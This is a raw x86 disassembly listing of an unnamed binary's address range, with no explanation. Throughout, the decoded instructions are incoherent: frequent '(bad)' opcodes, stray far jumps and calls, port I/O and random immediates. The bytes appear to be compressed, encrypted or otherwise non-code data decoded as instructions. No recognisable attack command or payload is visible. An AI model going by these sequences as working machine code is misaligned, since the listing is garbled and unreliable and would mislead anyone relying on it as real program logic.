  418dfd:	sub    edx,ecx
  418dff:	or     bl,BYTE PTR [edx-0x40897ed3]
  418e05:	xor    DWORD PTR [ebp+0x2d5bc3da],edx
  418e0b:	push   ds
  418e0c:	cmp    eax,0x52305d55
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x5e]
  418e81:	or     ebx,DWORD PTR [edi+0x107e54d]
  418e87:	add    BYTE PTR ds:0x1f000001,al
  418e8d:	data16 sti 
  418e8f:	icebp  
  418e90:	mov    bh,0x5b
  418e92:	dec    ebp
  418e93:	push   edi
  418e94:	ret    0x8831
  418e97:	ret    0xa0a6
  418e9a:	(bad)  
  418e9b:	into   
  418e9c:	retf   0xa73c
  418e9f:	fwait
  418ea0:	sbb    BYTE PTR [eax+0x37],bl
  418ea3:	lea    esi,[edi]
  418ea5:	mov    ebp,0x7e217b8f
  418eaa:	xchg   edx,eax
  418eab:	mov    DWORD PTR [ebx],esi
  418ead:	inc    esp
  418eae:	add    edx,DWORD PTR [eax]
  418eb0:	fild   WORD PTR [esi+esi*2]
  418eb3:	push   ebp
  418eb4:	jae    0x418f00
  418eb6:	cmc    
  418eb7:	xchg   esp,eax
  418eb8:	push   cs
  418eb9:	mov    bh,0x51
  418ebb:	pop    ecx
  418ebc:	jge    0x418f29
  418ebe:	fisub  DWORD PTR [edi+0xe]
  418ec1:	nop
  418ec2:	push   ebx
  418ec3:	dec    ecx
  418ec4:	mov    al,BYTE PTR [edi+0x10]
  418ec7:	and    DWORD PTR [ebx],ebp
  418ec9:	popf   
  418eca:	enter  0x7164,0x9b
  418ece:	dec    ebp
  418ecf:	mov    ds:0xc8e4e16e,al
  418ed4:	aad    0x46
  418ed6:	stos   BYTE PTR es:[edi],al
  418ed7:	out    0xac,al
  418ed9:	std    
  418eda:	js     0x418f34
  418edc:	daa    
  418edd:	mov    al,ds:0x62f183f1
  418ee2:	mov    dh,0xd0
  418ee4:	push   esi
  418ee5:	pop    edi
  418ee6:	gs jge 0x418f40
  418ee9:	inc    ebp
  418eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eeb:	jle    0x418f4f
  418eed:	and    al,0x3b
  418eef:	dec    esp
  418ef0:	aam    0x90
  418ef2:	or     eax,0x8b950959
  418ef7:	cmp    esp,0xa6935387
  418efd:	mov    cl,0x23
  418eff:	loop   0x418eb6
  418f01:	sahf   
  418f02:	sbb    eax,0x28ef1e88
  418f07:	lods   al,BYTE PTR ds:[esi]
  418f08:	cmp    eax,0xa22de8ee
  418f0d:	scas   al,BYTE PTR es:[edi]
  418f0e:	and    eax,ecx
  418f10:	inc    esi
  418f11:	std    
  418f12:	ret    0x392a
  418f15:	loope  0x418f62
  418f17:	sbb    eax,0x2de1021d
  418f1c:	mov    esp,0x8c8ac59a
  418f21:	xchg   ecx,eax
  418f22:	sub    esp,DWORD PTR [ecx+0x60cd58d7]
  418f28:	add    BYTE PTR [edx+0x143fd6cd],0x78
  418f2f:	pop    eax
  418f30:	mov    esi,0xc18a1b5a
  418f35:	loop   0x418f51
  418f37:	bnd jns 0x418f31
  418f3a:	sti    
  418f3b:	sub    dl,BYTE PTR [ebx+0x52a81d6d]
  418f41:	aam    0xd
  418f43:	mov    cl,dl
  418f45:	mov    ch,0x50
  418f47:	cmp    cl,0x9
  418f4a:	sahf   
  418f4b:	enter  0x2b96,0x88
  418f4f:	inc    edx
  418f50:	cdq    
  418f51:	sti    
  418f52:	fdiv   st,st(7)
  418f54:	adc    eax,0x2e973139
  418f59:	jmp    0xc6e9:0x956e1f24
  418f60:	enter  0x52f2,0xb6
  418f64:	jmp    0x3ddb:0x5637c40c
  418f6b:	ret    
  418f6c:	lods   eax,DWORD PTR ds:[esi]
  418f6d:	pop    eax
  418f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f6f:	and    bl,bh
  418f71:	bnd js 0x418f10
  418f74:	jge    0x418f35
  418f76:	mov    cl,0x5e
  418f78:	lock shl esi,1
  418f7b:	cli    
  418f7c:	retf   0xdace
  418f7f:	push   ebx
  418f80:	in     al,dx
  418f81:	sahf   
  418f82:	int    0xa0
  418f84:	lods   al,BYTE PTR ds:[esi]
  418f85:	mov    al,ds:0x57ee3f86
  418f8a:	mov    ds:0x55944629,eax
  418f8f:	aam    0xce
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x47eaf1a7]
  419001:	mov    dl,0x7
  419003:	jge    0x418fef
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0x2a000001,al
  41900d:	bound  edx,QWORD PTR [esi]
  41900f:	mov    ss,WORD PTR [edx]
  419011:	stos   BYTE PTR es:[edi],al
  419012:	fdivrp st(2),st
  419014:	adc    al,0xae
  419016:	and    ch,al
  419018:	std    
  419019:	ss jmp 0x419013
  41901c:	gs call 0xf0a7:0x1b7515cb
  419024:	push   ecx
  419025:	ss mov edi,0xb5310a5a
  41902b:	dec    ebp
  41902c:	aam    0x9f
  41902e:	dec    edx
  41902f:	and    esp,DWORD PTR [ecx+esi*4]
  419032:	sub    DWORD PTR [esi+0x6f1ab3a3],0x5f
  419039:	dec    ebx
  41903a:	xchg   ebx,eax
  41903b:	or     DWORD PTR [esi],ecx
  41903d:	sub    BYTE PTR [edx],dl
  41903f:	in     al,dx
  419040:	xchg   ecx,eax
  419041:	pop    edi
  419042:	pop    ds
  419043:	adc    ebp,DWORD PTR [edi-0x3e2d516]
  419049:	icebp  
  41904a:	sub    BYTE PTR [ebx-0x2a0e5af9],bh
  419050:	rcl    DWORD PTR [ecx+eiz*8],1
  419053:	loopne 0x419054
  419055:	in     al,dx
  419056:	sbb    DWORD PTR [ecx-0x6bb52401],esi
  41905c:	push   ebx
  41905d:	(bad)  
  41905f:	icebp  
  419060:	jmp    0x41903d
  419062:	mov    dh,0xf5
  419064:	dec    eax
  419065:	aad    0x6
  419067:	inc    ecx
  419068:	add    ch,BYTE PTR [edi-0x2461fdd8]
  41906e:	and    BYTE PTR [esi+eiz*1],bh
  419071:	add    BYTE PTR [eax-0x5372f49c],dh
  419077:	popf   
  419078:	xor    eax,ecx
  41907a:	mov    ds:0xfaf2ce0b,al
  41907f:	ins    BYTE PTR es:[edi],dx
  419080:	outs   dx,BYTE PTR ds:[esi]
  419081:	push   ss
  419082:	lods   al,BYTE PTR ds:[esi]
  419083:	fisub  DWORD PTR [ebp-0x75c97807]
  419089:	ret    
  41908a:	mov    ch,0xe8
  41908c:	and    eax,0xaa54d0c6
  419091:	scas   al,BYTE PTR es:[edi]
  419092:	cmp    bh,ch
  419094:	lods   al,BYTE PTR ds:[esi]
  419095:	scas   al,BYTE PTR es:[edi]
  419096:	push   esp
  419097:	add    edx,DWORD PTR [edi+0x195d807e]
  41909d:	out    dx,eax
  41909e:	loope  0x4190a6
  4190a0:	leave  
  4190a1:	ret    0xc455
  4190a4:	adc    al,0x93
  4190a6:	into   
  4190a7:	push   edx
  4190a8:	add    DWORD PTR [edi],esp
  4190aa:	dec    ebp
  4190ab:	push   cs
  4190ac:	mov    esp,DWORD PTR ds:0x4da57f2b
  4190b2:	call   0x9b40:0x9671f42f
  4190b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190ba:	mov    al,ds:0x28a7a364
  4190bf:	sar    bl,0xf7
  4190c2:	retf   0x8a76
  4190c5:	pop    edi
  4190c6:	sbb    DWORD PTR fs:[edi],0x34
  4190ca:	jno    0x4190e7
  4190cc:	sub    dh,bh
  4190ce:	call   0x507a1fa6
  4190d3:	and    bh,BYTE PTR [esi+0x1151a03f]
  4190d9:	outs   dx,DWORD PTR ds:[esi]
  4190da:	dec    esp
  4190db:	jle    0x4190f7
  4190dd:	sub    eax,0x3429e01a
  4190e2:	sub    BYTE PTR [edi+0x76],dl
  4190e5:	fwait
  4190e6:	imul   esp,DWORD PTR [ebp-0x41],0xffffffbc
  4190ea:	jg     0x41906c
  4190ec:	outs   dx,BYTE PTR ds:[esi]
  4190ed:	or     DWORD PTR [ebx+0x198cf0bd],ebx
  4190f3:	pusha  
  4190f4:	(bad)  
  4190f6:	push   cs
  4190f7:	inc    ebp
  4190f8:	jne    0x419179
  4190fa:	jp     0x4190ec
  4190fc:	icebp  
  4190fd:	out    dx,al
  4190fe:	cdq    
  4190ff:	test   DWORD PTR [edx],0x51faa5d0
  419105:	call   0x43b8364e
  41910a:	inc    edx
  41910b:	ret    0x25c8
  41910e:	and    ebx,esi
  419110:	leave  
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     cl,BYTE PTR [ebx-0x37]
  419182:	rol    BYTE PTR [ecx],cl
  419184:	out    dx,eax
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0x4e000001,al
  41918d:	sub    ebx,ebp
  41918f:	loope  0x4191b6
  419191:	jmp    FWORD PTR [ebp+0x2feb0a26]
  419197:	cmp    eax,0xf72b59a4
  41919c:	cmp    eax,0x1e281000
  4191a1:	pop    eax
  4191a2:	add    BYTE PTR [ebx+0x78],0x5c
  4191a6:	jecxz  0x4191eb
  4191a8:	test   edi,edx
  4191aa:	push   0x182d2ef5
  4191af:	ds add al,0xe0
  4191b2:	dec    edx
  4191b3:	cmp    eax,0x6771b3d5
  4191b8:	and    al,cl
  4191ba:	jge    0x41916f
  4191bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191bd:	push   eax
  4191be:	pop    esi
  4191bf:	dec    esp
  4191c0:	jbe    0x41921c
  4191c2:	(bad)  
  4191c3:	in     al,dx
  4191c4:	jbe    0x4191c5
  4191c6:	stos   DWORD PTR es:[edi],eax
  4191c7:	leave  
  4191c8:	xchg   esi,eax
  4191c9:	mov    ebp,0x80fd3ed1
  4191ce:	test   eax,0x2d936067
  4191d3:	dec    edi
  4191d4:	imul   ecx,esp,0x8793911f
  4191da:	shl    edi,1
  4191dc:	out    0x94,eax
  4191de:	xchg   BYTE PTR [ebx+0x32efc59d],bh
  4191e4:	ds or  al,0xd
  4191e7:	and    al,0xba
  4191e9:	mov    al,ds:0xec21d088
  4191ee:	je     0x4191d3
  4191f0:	pushf  
  4191f1:	(bad)  
  4191f2:	jno    0x4191f2
  4191f4:	fadd   QWORD PTR [esi-0x56]
  4191f7:	inc    ecx
  4191f8:	sar    esp,1
  4191fa:	fld    TBYTE PTR [ebp-0x10]
  4191fd:	push   ebp
  4191fe:	into   
  4191ff:	sbb    DWORD PTR [ebx],esp
  419201:	loop   0x419199
  419203:	mov    edx,0x810f036e
  419208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419209:	not    esi
  41920b:	sub    bl,bl
  41920d:	sahf   
  41920e:	in     eax,0x7e
  419210:	aaa    
  419211:	mov    ebx,0x1587f4ca
  419216:	mov    esp,0xb7cd337b
  41921b:	push   0xffffff9c
  41921d:	jnp    0x4191ed
  41921f:	adc    cl,bl
  419221:	(bad)  
  419222:	out    dx,al
  419223:	push   esi
  419224:	inc    esi
  419225:	add    eax,0x849cb068
  41922a:	pushf  
  41922b:	data16 jb 0x4191d2
  41922e:	popf   
  41922f:	rcr    ecx,1
  419231:	outs   dx,DWORD PTR ds:[esi]
  419232:	ficomp WORD PTR [esi+eax*1-0x14]
  419236:	arpl   dx,dx
  419238:	mov    bl,0xa4
  41923a:	push   es
  41923b:	(bad)  [edx-0x715539e8]
  419241:	daa    
  419242:	nop
  419243:	mov    bh,0x17
  419245:	mov    eax,0x1878d199
  41924a:	fdivr  DWORD PTR [edx+0x53f43efc]
  419250:	js     0x419256
  419252:	add    al,0x7b
  419254:	dec    eax
  419255:	inc    esi
  419256:	push   0x5236d633
  41925b:	sub    eax,0xa59deaf2
  419260:	dec    esp
  419261:	lds    ecx,FWORD PTR [esi+edi*8]
  419264:	repnz lea esi,[edi+0x2587f4fc]
  41926b:	push   esi
  41926c:	das    
  41926d:	mov    ebp,0x9c6338dc
  419272:	int3   
  419273:	inc    esp
  419274:	adc    ch,ah
  419276:	pop    esi
  419277:	sub    edi,edi
  419279:	pop    ecx
  41927a:	xchg   esi,eax
  41927b:	popa   
  41927c:	and    DWORD PTR [ecx+0x4fabe672],esp
  419282:	cdq    
  419283:	inc    eax
  419284:	imul   esi,esi,0xe
  419287:	and    eax,0x3c826f6d
  41928c:	sbb    dl,BYTE PTR [eax+0x2261dd]
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	add    eax,ecx
  419302:	daa    
  419303:	mov    dh,0xf4
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0x10000001,al
  41930d:	jns    0x4192fb
  41930f:	std    
  419310:	mov    ebp,0xf090b918
  419315:	hlt    
  419316:	adc    BYTE PTR [edi-0x116c6262],dl
  41931c:	pop    ecx
  41931d:	mov    esp,0x41798ca9
  419322:	mov    edx,0x4f512a5a
  419327:	scas   al,BYTE PTR es:[edi]
  419328:	cs jae 0x4192f6
  41932b:	mov    dl,0x76
  41932d:	or     dl,dl
  41932f:	icebp  
  419330:	xchg   edi,eax
  419331:	fisubr WORD PTR [esi+0x29]
  419334:	jb     0x419304
  419336:	dec    eax
  419337:	scas   al,BYTE PTR es:[edi]
  419338:	cmp    eax,0x657c0366
  41933d:	mul    bh
  41933f:	loop   0x419313
  419341:	add    eax,DWORD PTR [eax]
  419343:	and    ah,BYTE PTR [edi+0x416c35a3]
  419349:	scas   al,BYTE PTR es:[edi]
  41934a:	add    DWORD PTR [ecx-0x19cabb10],eax
  419350:	daa    
  419351:	pop    edi
  419352:	(bad)  
  419353:	retf   
  419354:	and    DWORD PTR [esi],esp
  419356:	pop    ds
  419357:	xor    al,0x6e
  419359:	xor    BYTE PTR [eax+0x0],0xfb
  41935d:	push   ss
  41935e:	sub    DWORD PTR [ebx],edx
  419360:	in     al,dx
  419361:	scas   eax,DWORD PTR es:[edi]
  419362:	es jmp 0x5fa0bc05
  419368:	or     DWORD PTR [eax],eax
  41936a:	adc    BYTE PTR [edx-0x71391f1d],dl
  419370:	mov    al,ds:0x5a4d2a4e
  419375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419376:	add    DWORD PTR [esi],0xf1dc7fe7
  41937c:	mov    edi,0x3c48a682
  419381:	xor    BYTE PTR [edx+0x9],0xb2
  419385:	mov    dl,0xc
  419387:	je     0x41930a
  419389:	dec    eax
  41938a:	or     dl,ch
  41938c:	dec    ebp
  41938d:	xchg   esi,eax
  41938e:	and    eax,0xe39ead0f
  419393:	and    BYTE PTR [ecx-0x6c5f90d0],cl
  419399:	mov    al,ss:0xf9fa6a13
  41939f:	ds push cs
  4193a1:	jle    0x4193a3
  4193a3:	inc    edi
  4193a4:	cmp    edi,edi
  4193a6:	or     al,0x11
  4193a8:	ret    
  4193a9:	and    edx,0xe
  4193ac:	out    dx,eax
  4193ad:	dec    ebx
  4193ae:	jmp    DWORD PTR [ecx-0x69b30d7f]
  4193b4:	and    DWORD PTR [esi],esi
  4193b6:	sahf   
  4193b7:	inc    ebp
  4193b8:	inc    ebp
  4193b9:	inc    BYTE PTR [eax+0x748078d7]
  4193bf:	pop    esp
  4193c0:	sub    DWORD PTR [esi-0x40],edx
  4193c3:	jb     0x419440
  4193c5:	xor    edx,ecx
  4193c7:	out    0xda,eax
  4193c9:	or     al,0xd2
  4193cb:	mov    ss,esp
  4193cd:	fcom   DWORD PTR [ebx+0x7c]
  4193d0:	jmp    0x419403
  4193d2:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4193d4:	mov    DWORD PTR [edi+0x2389676a],edi
  4193da:	push   cs
  4193db:	shl    DWORD PTR [ecx],1
  4193dd:	rcl    DWORD PTR [ebx],0x82
  4193e0:	(bad)  
  4193e1:	cmp    cl,BYTE PTR [eax+0x632e9c67]
  4193e7:	aad    0xb4
  4193e9:	mov    ah,0x8
  4193eb:	jbe    0x4193cc
  4193ed:	cmp    esp,edi
  4193ef:	xor    BYTE PTR [esi+0x4f7be52c],dh
  4193f5:	(bad)  
  4193f6:	lods   eax,DWORD PTR ds:[esi]
  4193f7:	pop    ebp
  4193f8:	push   esi
  4193f9:	in     eax,dx
  4193fa:	dec    ebx
  4193fb:	mov    edx,0x55942c3d
  419400:	loopne 0x41945d
  419402:	ins    DWORD PTR es:[edi],dx
  419403:	icebp  
  419404:	sub    DWORD PTR [edi],ebp
  419406:	in     al,0x8
  419408:	cli    
  419409:	xchg   DWORD PTR [ebp+0x14],ecx
  41940c:	push   0x1d
  41940e:	retf   
  41940f:	stc    
  419410:	jno    0x419412
	...
  419472:	add    BYTE PTR [eax],al
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	dec    edx
  419481:	mov    ds:0xbf98d9b,eax
  419486:	add    DWORD PTR [eax],eax
  419488:	add    eax,0xf6000001
  41948d:	or     eax,0xfd113065
  419492:	ss mov ah,0xbb
  419495:	inc    esp
  419496:	(bad)  
  419497:	fisttp WORD PTR [edi-0x11]
  41949a:	mov    edi,0x3c75743e
  41949f:	(bad)  
  4194a1:	xchg   ecx,eax
  4194a2:	and    al,0x69
  4194a4:	jns    0x4194a9
  4194a6:	(bad)  
  4194a7:	rcl    BYTE PTR [esi-0x207181e0],cl
  4194ad:	retf   
  4194ae:	mov    bh,0x30
  4194b0:	lahf   
  4194b1:	pop    ebx
  4194b2:	sub    BYTE PTR [ecx],bl
  4194b4:	not    DWORD PTR [esi+0x654ef75e]
  4194ba:	aas    
  4194bb:	inc    DWORD PTR [ebx+0x5d]
  4194be:	jae    0x41945a
  4194c0:	xchg   BYTE PTR [esp+ecx*8],al
  4194c3:	fmul   st(4),st
  4194c5:	(bad)  
  4194c6:	(bad)  
  4194c7:	mov    ecx,0x2bac115e
  4194cc:	xor    ah,dl
  4194ce:	addr16 jg 0x41949a
  4194d1:	(bad)  
  4194d2:	mov    eax,ds:0x584747ea
  4194d7:	adc    DWORD PTR [edi-0x24],0xffffffdc
  4194db:	hlt    
  4194dc:	sub    bh,BYTE PTR [ebx+0x7788763b]
  4194e2:	jns    0x419485
  4194e4:	data16 fwait
  4194e6:	cwde   
  4194e7:	push   0x20d908cd
  4194ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194ed:	rcr    BYTE PTR [eax+0xe],cl
  4194f0:	stos   DWORD PTR es:[edi],eax
  4194f1:	fstp   st(2)
  4194f3:	in     eax,0x75
  4194f5:	mov    esp,0xa197b4a8
  4194fa:	mov    al,ds:0x3b8ae01
  4194ff:	and    eax,0x902ba60
  419504:	xchg   esi,eax
  419505:	push   ss
  419506:	(bad)  
  419507:	loopne 0x419518
  419509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41950a:	dec    esp
  41950b:	add    eax,0x2f2b70a9
  419510:	mov    bh,0x7c
  419512:	mov    DWORD PTR [eax-0xb6ea592],ebp
  419518:	shl    BYTE PTR [edi-0xf],cl
  41951b:	outs   dx,BYTE PTR ds:[esi]
  41951c:	loope  0x41958c
  41951e:	repz daa 
  419520:	call   0x4cee:0xa278e39f
  419527:	pop    esi
  419528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419529:	scas   al,BYTE PTR es:[edi]
  41952a:	push   edx
  41952b:	inc    ecx
  41952c:	jmp    0x4194d5
  41952e:	sahf   
  41952f:	inc    edi
  419530:	jmp    0xaaeb:0xa16311bc
  419537:	hlt    
  419538:	ds in  al,0xce
  41953b:	and    ah,BYTE PTR [eax+edi*8-0x766f6556]
  419542:	pop    edi
  419543:	dec    eax
  419544:	sub    ch,BYTE PTR [eax]
  419546:	push   esi
  419547:	dec    esp
  419548:	aas    
  419549:	pop    ebp
  41954a:	xchg   ecx,eax
  41954b:	add    ch,ah
  41954d:	xor    DWORD PTR [esi-0x9642fe],0x61f15000
  419557:	scas   al,BYTE PTR es:[edi]
  419558:	sahf   
  419559:	sti    
  41955a:	out    dx,eax
  41955b:	add    eax,0x284e713e
  419560:	push   ss
  419561:	into   
  419562:	push   ebx
  419563:	mov    ecx,0x35f33263
  419568:	push   eax
  419569:	push   esi
  41956a:	add    eax,0x7e34c39b
  41956f:	(bad)  
  419570:	xlat   BYTE PTR ds:[ebx]
  419571:	sbb    dh,BYTE PTR [ebp-0x7c9c9c]
  419577:	xchg   esp,eax
  419578:	xchg   edi,eax
  419579:	and    ebp,DWORD PTR [edi+eiz*2-0x2fe469ca]
  419580:	pop    esp
  419581:	push   cs
  419582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419583:	sbb    bl,dh
  419585:	dec    esi
  419586:	sub    al,0x59
  419588:	xor    al,0xcc
  41958a:	outs   dx,BYTE PTR ds:[esi]
  41958b:	addr16 add ah,bl
  41958e:	das    
  41958f:	es xchg ebp,eax
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	test   BYTE PTR ds:0xcfef286,dh
  419606:	add    DWORD PTR [eax],eax
  419608:	add    eax,0xf0000001
  41960d:	addr16 mov eax,ds:0x82d2
  419611:	mov    dl,BYTE PTR [ecx-0x31]
  419614:	or     eax,0xf81ca0d1
  419619:	div    DWORD PTR [ecx+0x2f335c5a]
  41961f:	call   0xa2a5:0x305cde14
  419626:	jns    0x4195bf
  419628:	sub    dl,0xe4
  41962b:	std    
  41962c:	fstp   QWORD PTR ss:[ebp+edi*2-0x3c]
  419631:	dec    ecx
  419632:	push   0xfffffff0
  419634:	sub    ebp,DWORD PTR [eax-0x1660aaaa]
  41963a:	xchg   edi,eax
  41963b:	adc    cl,dh
  41963d:	shl    BYTE PTR [ebx-0x22],0xb9
  419641:	mov    dh,0x50
  419643:	dec    ecx
  419644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419645:	pop    es
  419646:	ds add eax,0x7f34eaad
  41964c:	pop    esi
  41964d:	rcl    BYTE PTR [edi+eiz*4],cl
  419650:	xchg   DWORD PTR [ebx-0x25],ebx
  419653:	nop
  419654:	lea    ebp,[edi-0x6abe12e]
  41965a:	xchg   ebx,eax
  41965b:	out    dx,al
  41965c:	icebp  
  41965d:	int    0x3
  41965f:	inc    ecx
  419660:	push   ebx
  419661:	lods   al,BYTE PTR ds:[esi]
  419662:	mov    DWORD PTR [ebx-0x31],edi
  419665:	mov    esi,0x2e9e13a5
  41966a:	pop    edi
  41966b:	out    0xaf,eax
  41966d:	stc    
  41966e:	fidivr WORD PTR [edx+0x33]
  419671:	dec    ebx
  419672:	mov    BYTE PTR [esi-0x73471838],bh
  419678:	jae    0x419630
  41967a:	mov    DWORD PTR [eax-0x10],ebx
  41967d:	cmp    DWORD PTR [ecx],edi
  41967f:	imul   DWORD PTR [esi+0x12430e69]
  419685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419686:	mov    ah,0x1a
  419688:	push   eax
  419689:	jp     0x41969f
  41968b:	arpl   bx,di
  41968d:	sub    BYTE PTR [edx-0x485a1d5b],0x80
  419694:	(bad)  
  419695:	ja     0x4196ac
  419697:	gs sti 
  419699:	mov    ah,al
  41969b:	xor    DWORD PTR [eax+edx*8+0x6be330b5],0xffffffd7
  4196a3:	js     0x419644
  4196a5:	retf   
  4196a6:	sbb    al,0xf5
  4196a8:	or     dh,BYTE PTR [esi-0x30]
  4196ab:	das    
  4196ac:	jb     0x419649
  4196ae:	lods   al,BYTE PTR ds:[esi]
  4196af:	mov    ds:0xd32c7a25,al
  4196b4:	fs pop ecx
  4196b6:	bound  edi,QWORD PTR [edx+0x4b]
  4196b9:	test   ah,0x3a
  4196bc:	add    eax,0x2ab4569a
  4196c1:	and    al,0xca
  4196c3:	ds pop edi
  4196c5:	das    
  4196c6:	test   eax,0x5e28d2ac
  4196cb:	lock ret 0x7549
  4196cf:	sar    dl,1
  4196d1:	xchg   ecx,eax
  4196d2:	mov    esi,0xc1cb01eb
  4196d7:	fistp  DWORD PTR [esi-0x23]
  4196da:	and    BYTE PTR [ebp-0x68f47219],al
  4196e0:	mov    al,0xb6
  4196e2:	fisttp DWORD PTR [ecx-0x35]
  4196e5:	sub    esp,DWORD PTR [ebx+eiz*8]
  4196e8:	shl    BYTE PTR [ecx+0x4c],1
  4196eb:	add    BYTE PTR [ebp+eiz*2+0xf],bh
  4196ef:	test   DWORD PTR [edi-0x20b3d0d4],edx
  4196f5:	call   0xb0d3a9a0
  4196fa:	call   0xfc382f4b
  4196ff:	test   eax,0x785f5dcb
  419704:	push   ss
  419705:	fist   WORD PTR [edi]
  419707:	or     edi,esi
  419709:	jbe    0x16022304
  41970f:	fwait
  419710:	arpl   WORD PTR [eax],ax
	...
  419772:	add    BYTE PTR [eax],al
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x38dd0ae
  419781:	sub    al,0x93
  419783:	sbb    al,0x3
  419785:	push   cs
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x40000001
  41978d:	test   ebx,edi
  41978f:	inc    ebp
  419790:	inc    edi
  419791:	mov    al,ds:0x1a3b1a6e
  419796:	cld    
  419797:	mov    ecx,0x571cadb7
  41979c:	psubq  mm7,QWORD PTR [ecx+0x3a7d2398]
  4197a3:	push   0xffffffac
  4197a5:	mov    esi,0xc8f800c2
  4197aa:	dec    esi
  4197ab:	rep outs dx,DWORD PTR ds:[esi]
  4197ad:	test   edx,edx
  4197af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197b0:	outs   dx,DWORD PTR ds:[esi]
  4197b1:	xchg   ebp,eax
  4197b2:	es pusha 
  4197b4:	fwait
  4197b5:	xchg   edx,eax
  4197b6:	lea    ecx,[edi+0x75]
  4197b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197ba:	ret    0x3e28
  4197bd:	sbb    edx,ebx
  4197bf:	call   0xdc80:0x3904f375
  4197c6:	inc    edi
  4197c7:	mov    edx,0x30531646
  4197cc:	mov    dh,0xd1
  4197ce:	mov    ah,0xfb
  4197d0:	out    0x57,al
  4197d2:	mov    eax,ds:0x73a0247
  4197d7:	pop    eax
  4197d8:	lds    ebx,FWORD PTR gs:[ecx+0x3a]
  4197dc:	xchg   edx,eax
  4197dd:	xchg   ecx,eax
  4197de:	lahf   
  4197df:	les    ecx,FWORD PTR [edi+0x10356383]
  4197e5:	mov    ch,0xaa
  4197e7:	mov    bh,0x6a
  4197e9:	into   
  4197ea:	and    eax,DWORD PTR [esi-0x27]
  4197ed:	bnd je 0x4197fe
  4197f0:	pop    esp
  4197f1:	test   BYTE PTR [edx-0x1a],dh
  4197f4:	cs mov bl,0x3f
  4197f7:	dec    edx
  4197f8:	lods   al,BYTE PTR ds:[esi]
  4197f9:	jge    0x41982f
  4197fb:	add    BYTE PTR [edx-0x5b],0xb0
  4197ff:	mov    al,0x68
  419801:	shl    BYTE PTR [edi-0x79bbef9b],1
  419807:	mov    ds:0x680c463c,al
  41980c:	(bad)  
  41980e:	pop    ds
  41980f:	sub    ecx,DWORD PTR [edi+esi*8+0x5f]
  419813:	pop    ds
  419814:	popf   
  419815:	aas    
  419816:	nop
  419817:	jge    0x41988f
  419819:	add    BYTE PTR [edx-0x177a767f],dl
  41981f:	scas   eax,DWORD PTR es:[edi]
  419820:	les    ebp,FWORD PTR [esi]
  419822:	cmp    BYTE PTR ds:0x161cf86b,ah
  419828:	add    eax,0x5ab1b9b
  41982d:	xchg   cl,bl
  41982f:	sbb    DWORD PTR [edi],ebx
  419831:	mov    ch,0xd5
  419833:	ret    
  419834:	stos   DWORD PTR es:[edi],eax
  419835:	sub    eax,0xf172ed8
  41983a:	scas   eax,DWORD PTR es:[edi]
  41983b:	test   eax,0x7a3afaa7
  419840:	das    
  419841:	mov    esi,0xc3d0cfbb
  419846:	stos   DWORD PTR es:[edi],eax
  419847:	push   ds
  419848:	neg    DWORD PTR [esi+0x11]
  41984b:	pop    esi
  41984c:	stos   BYTE PTR es:[edi],al
  41984d:	pop    ebp
  41984e:	xchg   esi,eax
  41984f:	(bad)  
  419850:	nop
  419851:	loope  0x41982f
  419853:	jg     0x419868
  419855:	jecxz  0x4198b0
  419857:	pushf  
  419858:	push   0x2bdcc87f
  41985d:	pop    es
  41985e:	xchg   ecx,eax
  41985f:	(bad)  
  419860:	sub    BYTE PTR [edi-0x64346420],bh
  419866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419867:	and    BYTE PTR [ebx-0x3b],bh
  41986a:	pusha  
  41986b:	push   edi
  41986c:	test   BYTE PTR [ebp-0x75],cl
  41986f:	jl     0x41983d
  419871:	xchg   esp,eax
  419872:	sbb    al,0x57
  419874:	add    eax,0xa85c4bf3
  419879:	rcl    ebp,1
  41987b:	cwde   
  41987c:	cli    
  41987d:	lds    esi,FWORD PTR [ecx]
  41987f:	pop    esp
  419880:	cmc    
  419881:	(bad)  
